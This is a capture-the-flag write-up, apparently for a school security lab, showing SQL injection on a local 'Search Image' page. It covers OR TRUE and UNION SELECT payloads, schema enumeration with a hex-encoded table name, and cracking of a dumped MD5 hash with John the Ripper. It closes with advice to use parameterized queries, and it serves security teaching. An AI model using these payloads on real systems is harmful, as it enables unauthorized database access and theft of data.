## [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

This vulnerability occurs on the [Search Image](http://localhost:8080/index.php?page=searchimg) page. We try every ID starting from `1` and with `5`, we get this:

```
ID: 5
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

Since this input field looks very vulnerable to SQL injections, we try a single quote like in the [Members](/sql_injection_members) page. It doesn't output anything, so we need to be more creative, with `42 OR TRUE--`:

```
ID: 5 OR TRUE--
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 5 OR TRUE--
Title: 42 !
Url : https://fr.wikipedia.org/wiki/Fichier:42

ID: 5 OR TRUE--
Title: Google
Url : https://fr.wikipedia.org/wiki/Logo_de_Go

ID: 5 OR TRUE--
Title: Earth
Url : https://en.wikipedia.org/wiki/Earth#/med

ID: 5 OR TRUE--
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

This doesn't give us anything new but it proves that the input field is vulnerable to SQL injections.

Now we use another command to see what tables we have access to:

```
ID: 42 UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=DATABASE()--
Title: list_images
Url :
```

We now explore `list_images`, by encoding the column name in hexa:

```
ID: 42 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
Title: id
Url :

ID: 42 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
Title: url
Url :

ID: 42 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
Title: title
Url :

ID: 42 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
Title: comment
Url :
```

There is a comment field which we didn't know about. Fetching its values gives us:

```
ID: 42 UNION SELECT title, comment FROM list_images--
Title: An image about the NSA !
Url : Nsa

ID: 42 UNION SELECT title, comment FROM list_images--
Title: There is a number..
Url : 42 !

ID: 42 UNION SELECT title, comment FROM list_images--
Title: Google it !
Url : Google

ID: 42 UNION SELECT title, comment FROM list_images--
Title: Earth!
Url : Earth

ID: 42 UNION SELECT title, comment FROM list_images--
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

We just need to follow the instructions:

```console
$ john --format=Raw-MD5 sql_injection_images/resources/comment
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=20
Proceeding with single, rules:Single
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2025-05-24 15:16) 0g/s 50750p/s 50750c/s 50750C/s Comment1909..Comment1900
Proceeding with wordlist:/tmp/tmpv8957wdu/password.lst
Enabling duplicate candidate password suppressor
albatroz         (comment)
1g 0:00:00:00 DONE 2/3 (2025-05-24 15:16) 9.090g/s 2164Kp/s 2164Kc/s 2164KC/s billy420..Thanks
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
$ echo -n albatroz | sha256sum
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188  -
```

To defend against SQL injections, use parameterized queries (also known as prepared statements) everywhere so the driver, not your code, handles quoting and type-checking. Escaping tricks like replacing quotes only give a false sense of security—an attacker will just switch to `0x`, `CHAR()` or similar tricks.
